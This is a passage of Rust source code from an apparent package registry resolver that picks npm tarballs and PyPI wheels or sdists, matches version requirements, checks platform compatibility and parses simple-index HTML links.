        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let bytes = download_artifact(client, &preliminary, &options.project_dir)?;
    let manifest = npm_manifest_from_tgz(&bytes)?;
    let resolved_name = if spec.name == NPM_DIRECT_TARBALL_PLACEHOLDER {
        manifest
            .name
            .clone()
            .filter(|name| !name.is_empty())
            .ok_or_else(|| {
                OmcRegistryError::UnsupportedSpec(format!(
                    "direct npm tarball `{source_url}` did not declare a package name"
                ))
            })?
    } else {
        spec.name.clone()
    };
    let platform_compatible = npm_manifest_platform_compatible(&manifest);
    let dependencies = npm_manifest_runtime_dependencies(&manifest);

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: resolved_name,
        version: manifest.version,
        source_url,
        download_url: None,
        local_path,
        filename,
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: true,
        pypi_direct_wheel: false,
        npm_scripts: manifest.scripts.unwrap_or_default(),
        platform_compatible,
        dependencies,
    })
}

fn npm_direct_tarball_source(
    source_url: &str,
    package_name: &str,
) -> Result<(Option<PathBuf>, String)> {
    let url = reqwest::Url::parse(source_url)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(source_url.to_owned()))?;
    let local_path = match url.scheme() {
        "https" => None,
        "file" => Some(url.to_file_path().map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "direct npm tarball URL for `{package_name}` must use a valid file URL"
            ))
        })?),
        _ => {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "direct npm tarball URL for `{package_name}` must use https or file"
            )));
        }
    };
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(source_url.to_owned()))?;
    require_npm_tarball_path(&filename)?;
    Ok((local_path, filename))
}

fn resolve_npm_lockfile_tarball(
    spec: &PackageSpec,
    install_name: &str,
    version_requirement: Option<&str>,
    options: &LinkOptions,
) -> Result<Option<ResolvedPackage>> {
    let key = spec.constraint_key();
    let Some(version) = options.constraints.get(&key) else {
        return Ok(None);
    };
    let Some(source_url) = options.npm_resolved.get(&key) else {
        return Ok(None);
    };
    if version_requirement
        .map(|requirement| npm_version_satisfies(version, requirement))
        .unwrap_or(true)
    {
        return Ok(Some(npm_direct_tarball_package(
            install_name,
            version,
            source_url,
        )?));
    }
    Ok(None)
}

fn npm_direct_tarball_package(
    install_name: &str,
    version: &str,
    source_url: &str,
) -> Result<ResolvedPackage> {
    let url = reqwest::Url::parse(source_url)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(source_url.to_owned()))?;
    if url.scheme() != "https" {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "locked npm tarball URL for `{install_name}` must use https"
        )));
    }
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .unwrap_or_else(|| format!("{install_name}-{version}.tgz"));

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: install_name.to_owned(),
        version: version.to_owned(),
        source_url: source_url.to_owned(),
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: true,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn npm_registry_name_and_requirement(spec: &PackageSpec) -> Result<(String, Option<String>)> {
    let Some(requirement) = spec.version.as_deref() else {
        return Ok((spec.name.clone(), None));
    };
    let Some(alias) = requirement.strip_prefix("npm:") else {
        return Ok((spec.name.clone(), Some(requirement.to_owned())));
    };
    let alias_spec = parse_npm_spec(requirement, alias)?;
    Ok((alias_spec.name, alias_spec.version))
}

fn npm_runtime_dependencies(version_doc: &NpmVersion) -> Vec<PackageDependency> {
    npm_dependency_fields(
        version_doc.dependencies.clone(),
        version_doc.optional_dependencies.clone(),
        version_doc.bundle_dependencies.as_ref(),
        version_doc.bundled_dependencies.as_ref(),
        version_doc.peer_dependencies.clone(),
        version_doc.peer_dependencies_meta.clone(),
    )
}

fn npm_dependency_fields(
    dependencies_field: Option<BTreeMap<String, String>>,
    optional_dependencies_field: Option<BTreeMap<String, String>>,
    bundle_dependencies: Option<&NpmStringList>,
    bundled_dependencies: Option<&NpmStringList>,
    peer_dependencies: Option<BTreeMap<String, String>>,
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
) -> Vec<PackageDependency> {
    let mut dependencies = Vec::new();
    let bundled = npm_bundled_dependency_names(
        dependencies_field.as_ref(),
        optional_dependencies_field.as_ref(),
        bundle_dependencies,
        bundled_dependencies,
    );

    dependencies.extend(
        dependencies_field
            .unwrap_or_default()
            .into_iter()
            .filter(|(name, _)| !bundled.contains(name))
            .map(|(name, requirement)| npm_dependency(name, requirement, false)),
    );
    dependencies.extend(
        optional_dependencies_field
            .unwrap_or_default()
            .into_iter()
            .filter(|(name, _)| !bundled.contains(name))
            .map(|(name, requirement)| npm_dependency(name, requirement, true)),
    );
    dependencies.extend(
        required_peer_dependencies(
            peer_dependencies.unwrap_or_default(),
            peer_dependencies_meta.unwrap_or_default(),
        )
        .into_iter()
        .filter(|(name, _)| !bundled.contains(name))
        .map(|(name, requirement)| npm_dependency(name, requirement, false)),
    );

    dependencies.sort_by(|left, right| {
        left.spec
            .name
            .cmp(&right.spec.name)
            .then_with(|| left.spec.version.cmp(&right.spec.version))
            .then_with(|| left.optional.cmp(&right.optional))
    });
    dependencies.dedup_by(|left, right| {
        left.spec.name == right.spec.name && left.spec.version == right.spec.version
    });
    dependencies
}

fn npm_bundled_dependency_names(
    dependencies: Option<&BTreeMap<String, String>>,
    optional_dependencies: Option<&BTreeMap<String, String>>,
    bundle_dependencies: Option<&NpmStringList>,
    bundled_dependencies: Option<&NpmStringList>,
) -> BTreeSet<String> {
    let field = bundle_dependencies.or(bundled_dependencies);

    match field.and_then(NpmStringList::bool_value) {
        Some(true) => dependencies
            .cloned()
            .unwrap_or_default()
            .into_keys()
            .chain(
                optional_dependencies
                    .cloned()
                    .unwrap_or_default()
                    .into_keys(),
            )
            .collect(),
        Some(false) => BTreeSet::new(),
        None => field
            .map(NpmStringList::values)
            .unwrap_or_default()
            .into_iter()
            .collect(),
    }
}

fn npm_dependency(name: String, requirement: String, optional: bool) -> PackageDependency {
    PackageDependency {
        spec: PackageSpec::new(Ecosystem::Npm, name, Some(requirement)),
        optional,
    }
}

fn npm_platform_compatible(version_doc: &NpmVersion) -> bool {
    npm_platform_fields(
        version_doc.os.as_ref(),
        version_doc.cpu.as_ref(),
        version_doc.libc.as_ref(),
    )
}

fn npm_platform_fields(
    os: Option<&NpmStringList>,
    cpu: Option<&NpmStringList>,
    libc: Option<&NpmStringList>,
) -> bool {
    npm_string_list_allows(os, Some(current_npm_os()))
        && npm_string_list_allows(cpu, Some(current_npm_cpu()))
        && npm_string_list_allows(libc, current_npm_libc())
}

fn npm_string_list_allows(list: Option<&NpmStringList>, current: Option<&str>) -> bool {
    let Some(list) = list else {
        return true;
    };
    let values = list.values();
    let Some(current) = current else {
        return values.iter().all(|value| value.strip_prefix('!').is_some());
    };

    if values
        .iter()
        .any(|value| value.strip_prefix('!') == Some(current))
    {
        return false;
    }

    let positive = values
        .iter()
        .filter(|value| !value.starts_with('!'))
        .collect::<Vec<_>>();
    positive.is_empty() || positive.iter().any(|value| value.as_str() == current)
}

fn current_npm_os() -> &'static str {
    match env::consts::OS {
        "macos" => "darwin",
        "windows" => "win32",
        other => other,
    }
}

fn current_npm_cpu() -> &'static str {
    match env::consts::ARCH {
        "x86_64" => "x64",
        "x86" | "i386" | "i586" | "i686" => "ia32",
        "aarch64" => "arm64",
        "arm" => "arm",
        "powerpc64" => "ppc64",
        "s390x" => "s390x",
        other => other,
    }
}

fn current_npm_libc() -> Option<&'static str> {
    #[cfg(all(target_os = "linux", target_env = "musl"))]
    {
        Some("musl")
    }
    #[cfg(all(target_os = "linux", target_env = "gnu"))]
    {
        Some("glibc")
    }
    #[cfg(not(any(
        all(target_os = "linux", target_env = "musl"),
        all(target_os = "linux", target_env = "gnu")
    )))]
    {
        None
    }
}

fn resolve_pypi(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
) -> Result<ResolvedPackage> {
    if spec.direct_url.is_some() {
        return resolve_pypi_direct_wheel(spec);
    }
    let target_python = current_python_version();
    let mut candidates =
        pypi_find_link_candidates(client, spec, options, target_python.as_deref())?;
    let simple_indexes = pypi_simple_index_urls(options);
    if !candidates.is_empty() || options.pypi_no_index {
        if !options.pypi_no_index {
            let indexes = if simple_indexes.is_empty() {
                vec!["https://pypi.org/simple/".to_owned()]
            } else {
                simple_indexes
            };
            candidates.extend(pypi_simple_index_candidates_from_indexes(
                client,
                spec,
                &indexes,
                target_python.as_deref(),
            )?);
        }
        return pypi_candidate_to_resolved(spec, options, candidates);
    }
    if !simple_indexes.is_empty() {
        let candidates = pypi_simple_index_candidates_from_indexes(
            client,
            spec,
            &simple_indexes,
            target_python.as_deref(),
        )?;
        return pypi_candidate_to_resolved(spec, options, candidates);
    }

    let encoded = urlencoding::encode(&spec.name);
    let constrained_requirement = constrained_pypi_requirement(spec, &options.constraints);
    let version = match constrained_requirement.as_deref() {
        Some(requirement) if is_exact_pypi_version(requirement) => requirement.to_owned(),
        Some(requirement) => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            choose_pypi_version(&spec.name, requirement, &root, target_python.as_deref())?
        }
        None => {
            let url = format!("https://pypi.org/pypi/{encoded}/json");
            let root = client
                .get(url)
                .send()?
                .error_for_status()?
                .json::<PypiRoot>()?;
            root.info.version
        }
    };
    let url = format!("https://pypi.org/pypi/{encoded}/{version}/json");
    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Err(OmcRegistryError::PackageNotFound(spec.requested()));
    }
    let doc = response.error_for_status()?.json::<PypiResponse>()?;
    let file = choose_pypi_file(&doc, target_python.as_deref())
        .ok_or_else(|| OmcRegistryError::MissingCompatibleWheel(spec.requested()))?;
    let source_url = file.url.clone();
    let filename = file.filename.clone();
    let expected_sha256 = file.digests.sha256.clone();
    let dependencies = doc
        .info
        .requires_dist
        .unwrap_or_default()
        .into_iter()
        .filter_map(|requirement| parse_pypi_requirement_with_extras(&requirement, &spec.extras))
        .map(|spec| PackageDependency {
            spec,
            optional: false,
        })
        .collect::<Vec<_>>();

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: doc.info.name,
        version: doc.info.version,
        source_url,
        download_url: None,
        local_path: None,
        filename,
        expected_sha256: Some(expected_sha256),
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies,
    })
}

fn pypi_simple_index_urls(options: &LinkOptions) -> Vec<String> {
    if options.pypi_index_url.is_none() && options.pypi_extra_index_urls.is_empty() {
        return Vec::new();
    }
    let mut indexes = Vec::new();
    indexes.push(
        options
            .pypi_index_url
            .clone()
            .unwrap_or_else(|| "https://pypi.org/simple/".to_owned()),
    );
    indexes.extend(options.pypi_extra_index_urls.clone());
    let mut seen = BTreeSet::new();
    indexes.retain(|index| seen.insert(index.clone()));
    indexes
}

fn pypi_simple_index_candidates_from_indexes(
    client: &Client,
    spec: &PackageSpec,
    indexes: &[String],
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    let mut candidates = Vec::new();
    for index in indexes {
        let url = pypi_simple_package_url(index, &spec.name)?;
        let response = client.get(url).send()?;
        if response.status().as_u16() == 404 {
            continue;
        }
        let base_url = response.url().clone();
        let html = response.error_for_status()?.text()?;
        candidates.extend(pypi_simple_index_candidates(
            &base_url,
            &html,
            &spec.name,
            target_python,
        ));
    }
    Ok(candidates)
}

fn pypi_candidate_to_resolved(
    spec: &PackageSpec,
    options: &LinkOptions,
    candidates: Vec<PypiSimpleCandidate>,
) -> Result<ResolvedPackage> {
    let requirement =
        constrained_pypi_requirement(spec, &options.constraints).unwrap_or_else(|| "*".to_owned());

    let candidate = candidates
        .into_iter()
        .filter(|candidate| pypi_version_satisfies(&candidate.version, &requirement))
        .max_by(|left, right| {
            compare_pypi_versions(&left.version, &right.version)
                .then_with(|| right.sdist.cmp(&left.sdist))
        })
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: spec.name.clone(),
            requirement,
        })?;

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: spec.name.clone(),
        version: candidate.version,
        source_url: candidate.url,
        download_url: candidate.download_url,
        local_path: candidate.local_path,
        filename: candidate.filename,
        expected_sha256: candidate.sha256,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: !candidate.sdist,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn pypi_simple_package_url(index: &str, package: &str) -> Result<reqwest::Url> {
    let base = reqwest::Url::parse(index)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(index.to_owned()))?;
    base.join(&format!("{}/", normalize_pypi_name(package)))
        .map_err(|_| OmcRegistryError::UnsupportedSpec(index.to_owned()))
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PypiSimpleCandidate {
    url: String,
    download_url: Option<String>,
    local_path: Option<PathBuf>,
    filename: String,
    version: String,
    sha256: Option<String>,
    sdist: bool,
}

fn pypi_find_link_candidates(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    let mut candidates = Vec::new();
    for source in &options.pypi_find_links {
        candidates.extend(pypi_find_link_source_candidates(
            client,
            source,
            &spec.name,
            target_python,
        )?);
    }
    Ok(candidates)
}

fn pypi_find_link_source_candidates(
    client: &Client,
    source: &str,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if let Ok(url) = reqwest::Url::parse(source) {
        return match url.scheme() {
            "http" | "https" => pypi_http_find_link_candidates(client, url, package, target_python),
            "file" => {
                let Ok(path) = url.to_file_path() else {
                    return Ok(Vec::new());
                };
                pypi_local_find_link_candidates(&path, package, target_python)
            }
            _ => Ok(Vec::new()),
        };
    }
    pypi_local_find_link_candidates(Path::new(source), package, target_python)
}

fn pypi_http_find_link_candidates(
    client: &Client,
    url: reqwest::Url,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .map(|filename| filename.ends_with(".whl") || is_python_sdist_filename(filename))
        .unwrap_or(false)
    {
        return Ok(
            pypi_candidate_from_url(url, package, None, target_python, None)
                .into_iter()
                .collect(),
        );
    }

    let response = client.get(url).send()?;
    if response.status().as_u16() == 404 {
        return Ok(Vec::new());
    }
    let base_url = response.url().clone();
    let html = response.error_for_status()?.text()?;
    Ok(pypi_simple_index_candidates(
        &base_url,
        &html,
        package,
        target_python,
    ))
}

fn pypi_local_find_link_candidates(
    source: &Path,
    package: &str,
    target_python: Option<&str>,
) -> Result<Vec<PypiSimpleCandidate>> {
    if source.is_dir() {
        let mut candidates = Vec::new();
        for entry in fs::read_dir(source)? {
            let path = entry?.path();
            if path.is_file() {
                candidates.extend(pypi_local_find_link_candidates(
                    &path,
                    package,
                    target_python,
                )?);
            }
        }
        return Ok(candidates);
    }
    if !source.is_file() {
        return Ok(Vec::new());
    }
    if source.extension().and_then(|ext| ext.to_str()) == Some("whl") {
        return Ok(pypi_local_archive_candidate(source, package, target_python)
            .into_iter()
            .collect());
    }
    if source
        .file_name()
        .and_then(|name| name.to_str())
        .map(is_python_sdist_filename)
        .unwrap_or(false)
    {
        return Ok(pypi_local_archive_candidate(source, package, target_python)
            .into_iter()
            .collect());
    }

    let html = fs::read_to_string(source)?;
    let Ok(base_url) = reqwest::Url::from_file_path(source) else {
        return Ok(Vec::new());
    };
    let mut candidates = pypi_simple_index_candidates(&base_url, &html, package, target_python);
    for candidate in &mut candidates {
        if candidate.local_path.is_none() {
            if let Ok(url) = reqwest::Url::parse(&candidate.url) {
                if url.scheme() == "file" {
                    candidate.local_path = url.to_file_path().ok();
                }
            }
        }
    }
    Ok(candidates)
}

fn pypi_local_archive_candidate(
    path: &Path,
    package: &str,
    target_python: Option<&str>,
) -> Option<PypiSimpleCandidate> {
    let url = reqwest::Url::from_file_path(path).ok()?;
    pypi_candidate_from_url(url, package, None, target_python, Some(path.to_path_buf()))
}

fn pypi_simple_index_candidates(
    base_url: &reqwest::Url,
    html: &str,
    package: &str,
    target_python: Option<&str>,
) -> Vec<PypiSimpleCandidate> {
    simple_index_links(base_url, html)
        .into_iter()
        .filter_map(|link| {
            pypi_candidate_from_url(
                link.url,
                package,
                link.requires_python.as_deref(),
                target_python,
                None,
            )
        })
        .collect()
}

fn pypi_candidate_from_url(
    mut url: reqwest::Url,
    package: &str,
    requires_python: Option<&str>,
    target_python: Option<&str>,
    local_path: Option<PathBuf>,
) -> Option<PypiSimpleCandidate> {
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())?;
    let (name, version, sdist) =
        if let Some((name, version)) = parse_wheel_name_and_version(&filename) {
            (name, version, false)
        } else if let Some((name, version)) = parse_sdist_name_and_version(&filename) {
            (name, version, true)
        } else {
            return None;
        };
    if name != normalize_pypi_name(package) {
        return None;
    }
    if !requires_python
        .map(|requirement| {
            target_python
                .map(|target_python| pypi_version_satisfies(target_python, requirement))
                .unwrap_or(true)
        })
        .unwrap_or(true)
    {
        return None;
    }
    if !sdist
        && !current_python_wheel_compatibility()
            .as_ref()
            .map(|compatibility| wheel_tag_compatible(&filename, compatibility))
            .unwrap_or(true)
    {
        return None;
    }
    let sha256 = url.fragment().and_then(simple_index_sha256_fragment);
    url.set_fragment(None);
    let mut source_url = url.clone();
    strip_url_credentials(&mut source_url);
    let download_url = (source_url != url).then(|| url.to_string());
    Some(PypiSimpleCandidate {
        url: source_url.to_string(),
        download_url,
        local_path,
        filename,
        version,
        sha256,
        sdist,
    })
}

#[derive(Debug, Clone)]
struct SimpleIndexLink {
    url: reqwest::Url,
    requires_python: Option<String>,
}

fn simple_index_links(base_url: &reqwest::Url, html: &str) -> Vec<SimpleIndexLink> {
    let mut links = Vec::new();
    let mut rest = html;
    while let Some(start) = rest.to_ascii_lowercase().find("<a") {
        rest = &rest[start..];
        let Some(end) = rest.find('>') else {
            break;
        };
        let tag = &rest[..=end];
        rest = &rest[end + 1..];
        let Some(href) = html_attr(tag, "href") else {
            continue;
        };
        let Ok(mut url) = base_url.join(&html_unescape(&href)) else {
            continue;
        };
        inherit_url_credentials(base_url, &mut url);
        links.push(SimpleIndexLink {
            url,
            requires_python: html_attr(tag, "data-requires-python")
                .map(|value| html_unescape(&value)),
        });
    }
    links
}

fn inherit_url_credentials(base_url: &reqwest::Url, url: &mut reqwest::Url) {
    if base_url.username().is_empty()
        || !url.username().is_empty()
        || base_url.scheme() != url.scheme()
        || base_url.host_str() != url.host_str()
        || base_url.port_or_known_default() != url.port_or_known_default()
    {
        return;
    }

    let _ = url.set_username(base_url.username());
    let _ = url.set_password(base_url.password());
}

fn strip_url_credentials(url: &mut reqwest::Url) {
    let _ = url.set_username("");
    let _ = url.set_password(None);
}

fn html_attr(tag: &str, attr: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let needle = format!("{attr}=");
    let start = lower.find(&needle)? + needle.len();
    let rest = &tag[start..];
    let quote = rest.chars().next()?;
    if quote == '"' || quote == '\'' {
        let value = &rest[quote.len_utf8()..];
        let end = value.find(quote)?;
        Some(value[..end].to_owned())
    } else {
        let end = rest
            .find(|ch: char| ch.is_whitespace() || ch == '>')
            .unwrap_or(rest.len());
        Some(rest[..end].to_owned())
    }
}

fn html_unescape(value: &str) -> String {
    value
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
}

fn simple_index_sha256_fragment(fragment: &str) -> Option<String> {
    fragment
        .split('&')
        .filter_map(|part| {
            let (key, value) = part.split_once('=')?;
            (key.eq_ignore_ascii_case("sha256"))
                .then(|| normalize_sha256_hash(&format!("sha256:{value}")))
                .flatten()
        })
        .next()
}

fn resolve_pypi_direct_wheel(spec: &PackageSpec) -> Result<ResolvedPackage> {
    let source_url = spec
        .direct_url
        .clone()
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let url = reqwest::Url::parse(&source_url)
        .map_err(|_| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let local_path = match url.scheme() {
        "https" => None,
        "file" => Some(url.to_file_path().map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "direct PyPI wheel URL for `{}` must use a valid file URL",
                spec.name
            ))
        })?),
        _ => {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "direct PyPI wheel URL for `{}` must use https or file",
                spec.name
            )));
        }
    };
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .ok_or_else(|| OmcRegistryError::UnsupportedSpec(spec.requested()))?;
    let (archive_name, version, pypi_sdist) =
        if let Some((name, version)) = parse_wheel_name_and_version(&filename) {
            (name, version, false)
        } else if let Some((name, version)) = parse_sdist_name_and_version(&filename) {
            (name, version, true)
        } else {
            return Err(OmcRegistryError::UnsupportedSpec(spec.requested()));
        };
    if archive_name != spec.name {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "direct PyPI archive filename `{filename}` does not match `{}`",
            spec.name
        )));
    }
    if !pypi_sdist
        && !current_python_wheel_compatibility()
            .as_ref()
            .map(|compatibility| wheel_tag_compatible(&filename, compatibility))
            .unwrap_or(true)
    {
        return Err(OmcRegistryError::MissingCompatibleWheel(spec.requested()));
    }

    Ok(ResolvedPackage {
        ecosystem: Ecosystem::Pypi,
        name: spec.name.clone(),
        version,
        source_url,
        download_url: None,
        local_path,
        filename,
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: !pypi_sdist,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    })
}

fn parse_wheel_name_and_version(filename: &str) -> Option<(String, String)> {
    let filename = filename.strip_suffix(".whl")?;
    let parts = filename.split('-').collect::<Vec<_>>();
    if parts.len() < 5 {
        return None;
    }
    Some((normalize_pypi_name(parts[0]), parts[1].to_owned()))
}

fn parse_sdist_name_and_version(filename: &str) -> Option<(String, String)> {
    let filename = filename
        .strip_suffix(".tar.gz")
        .or_else(|| filename.strip_suffix(".tgz"))
        .or_else(|| filename.strip_suffix(".zip"))?;
    let (name, version) = filename.rsplit_once('-')?;
    (!name.is_empty() && !version.is_empty())
        .then(|| (normalize_pypi_name(name), version.to_owned()))
}

fn constrained_pypi_requirement(
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    constrained_requirement(spec, constraints)
}

fn constrained_npm_requirement(
    spec: &PackageSpec,
    requirement: Option<&str>,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    match (requirement, constraints.get(&spec.constraint_key())) {
        (Some(requirement), Some(constraint)) if !requirement.trim().is_empty() => {
            Some(format!("{requirement},{constraint}"))
        }
        (Some(requirement), None) => Some(requirement.to_owned()),
        (_, Some(constraint)) => Some(constraint.clone()),
        (None, None) => None,
    }
}

fn constrained_requirement(
    spec: &PackageSpec,
    constraints: &BTreeMap<String, String>,
) -> Option<String> {
    match (
        spec.version.as_deref(),
        constraints.get(&spec.constraint_key()),
    ) {
        (Some(requirement), Some(constraint)) if !requirement.trim().is_empty() => {
            Some(format!("{requirement},{constraint}"))
        }
        (Some(requirement), None) => Some(requirement.to_owned()),
        (_, Some(constraint)) => Some(constraint.clone()),
        (None, None) => None,
    }
}

fn choose_pypi_file<'a>(
    doc: &'a PypiResponse,
    target_python: Option<&str>,
) -> Option<&'a PypiFile> {
    doc.urls
        .iter()
        .filter(|file| pypi_file_python_compatible(file, target_python))
        .find(|file| file.packagetype == "bdist_wheel" && file.filename.contains("py3-none-any"))
        .or_else(|| {
            doc.urls
                .iter()
                .filter(|file| pypi_file_python_compatible(file, target_python))
                .find(|file| file.packagetype == "bdist_wheel")
        })
        .or_else(|| {
            doc.urls
                .iter()
                .filter(|file| pypi_file_python_compatible(file, target_python))
                .find(|file| {
                    file.packagetype == "sdist" && is_python_sdist_filename(&file.filename)
                })
        })
}

fn is_python_sdist_filename(filename: &str) -> bool {
    let filename = filename.to_ascii_lowercase();
    filename.ends_with(".tar.gz") || filename.ends_with(".tgz") || filename.ends_with(".zip")
}

fn choose_npm_version(name: &str, requirement: &str, root: &NpmRoot) -> Result<String> {
    if requirement == "latest" {
        return Ok(root.dist_tags.latest.clone());
    }

    root.versions
        .keys()
        .filter(|version| npm_version_satisfies(version, requirement))
        .max_by(|left, right| compare_npm_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_npm_version(requirement: &str) -> bool {
    Version::parse(requirement).is_ok()
}

fn npm_version_satisfies(version: &str, requirement: &str) -> bool {
    let raw_version = version.trim();
    let Ok(version) = Version::parse(version) else {
        return false;
    };
    let requirement = requirement.trim();

    if requirement.is_empty() || requirement == "*" || requirement == "latest" {
        return true;
    }
    if let Ok(exact) = Version::parse(requirement) {
        return version == exact;
    }
    let parts = requirement
        .replace(',', " ")
        .split_whitespace()
        .map(str::to_owned)
        .collect::<Vec<_>>();
    if parts.len() > 1 {
        return parts
            .iter()
            .all(|part| npm_version_satisfies(raw_version, part));
    }
    if let Some(base) = requirement
        .strip_prefix('^')
        .and_then(parse_partial_npm_version)
    {
        let upper = if base.major > 0 {
            Version::new(base.major + 1, 0, 0)
        } else if base.minor > 0 {
            Version::new(0, base.minor + 1, 0)
        } else {
            Version::new(0, 0, base.patch + 1)
        };
        return version >= base && version < upper;
    }
    if let Some(base) = requirement
        .strip_prefix('~')
        .and_then(parse_partial_npm_version)
    {
        let upper = Version::new(base.major, base.minor + 1, 0);
        return version >= base && version < upper;
    }

    requirement
        .replace(',', " ")
        .split_whitespace()
        .all(|part| npm_comparator_satisfied(&version, part))
}

fn npm_comparator_satisfied(version: &Version, comparator: &str) -> bool {
    for op in [">=", "<=", ">", "<", "="] {
        if let Some(raw) = comparator.strip_prefix(op) {
            let Some(required) = parse_partial_npm_version(raw) else {
                return false;
            };
            return match op {
                ">=" => version >= &required,
                "<=" => version <= &required,
                ">" => version > &required,
                "<" => version < &required,
                "=" => version == &required,
                _ => false,
            };
        }
    }

    if comparator == "*" || comparator.eq_ignore_ascii_case("x") {
        true
    } else if comparator.ends_with(".x") || comparator.ends_with(".*") {
        let prefix = comparator.trim_end_matches('x').trim_end_matches('*');
        version.to_string().starts_with(prefix)
    } else {
        parse_partial_npm_version(comparator)
            .map(|required| version == &required)
            .unwrap_or(false)
    }
}

fn parse_partial_npm_version(raw: &str) -> Option<Version> {
    let mut parts = raw.trim().split('.');
    let major = parts.next()?.parse().ok()?;
    let minor = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    let patch = parts.next().and_then(|part| part.parse().ok()).unwrap_or(0);
    Some(Version::new(major, minor, patch))
}

fn compare_npm_versions(left: &str, right: &str) -> std::cmp::Ordering {
    match (Version::parse(left), Version::parse(right)) {
        (Ok(left), Ok(right)) => left.cmp(&right),
        _ => left.cmp(right),
    }
}

fn choose_pypi_version(
    name: &str,
    requirement: &str,
    root: &PypiRoot,
    target_python: Option<&str>,
) -> Result<String> {
    root.releases
        .iter()
        .filter(|(_, files)| {
            files
                .iter()
                .any(|file| pypi_file_python_compatible(file, target_python))
        })
        .map(|(version, _)| version)
        .filter(|version| pypi_version_satisfies(version, requirement))
        .max_by(|left, right| compare_pypi_versions(left, right))
        .cloned()
        .ok_or_else(|| OmcRegistryError::UnsatisfiedRequirement {
            name: name.to_owned(),
            requirement: requirement.to_owned(),
        })
}

fn is_exact_pypi_version(requirement: &str) -> bool {
    !requirement
        .chars()
        .any(|ch| matches!(ch, '<' | '>' | '=' | '!' | '~' | ',' | '*' | ' '))
}

fn pypi_version_satisfies(version: &str, requirement: &str) -> bool {
    let requirement = requirement.trim();
    if requirement.is_empty() || requirement == "*" {
        return true;
    }

    requirement
        .trim_matches(|ch| ch == '(' || ch == ')')
        .split(',')
        .map(str::trim)
        .filter(|part| !part.is_empty())
        .all(|part| pypi_comparator_satisfied(version, part))
}

fn pypi_file_python_compatible(file: &PypiFile, target_python: Option<&str>) -> bool {
    let python_compatible = target_python
        .and_then(|target_python| {
            file.requires_python
                .as_deref()
                .map(|requirement| pypi_version_satisfies(target_python, requirement))
        })
        .unwrap_or(true);
    if !python_compatible {
        return false;
    }

    if file.packagetype != "bdist_wheel" {
        return true;
    }

    current_python_wheel_compatibility()
        .as_ref()
        .map(|compatibility| wheel_tag_compatible(&file.filename, compatibility))
        .unwrap_or(true)
}

fn current_python_version() -> Option<String> {
    static CURRENT_PYTHON_VERSION: OnceLock<Option<String>> = OnceLock::new();
    CURRENT_PYTHON_VERSION
        .get_or_init(detect_python_version)
        .clone()
}

fn current_python_wheel_compatibility() -> Option<PythonWheelCompatibility> {
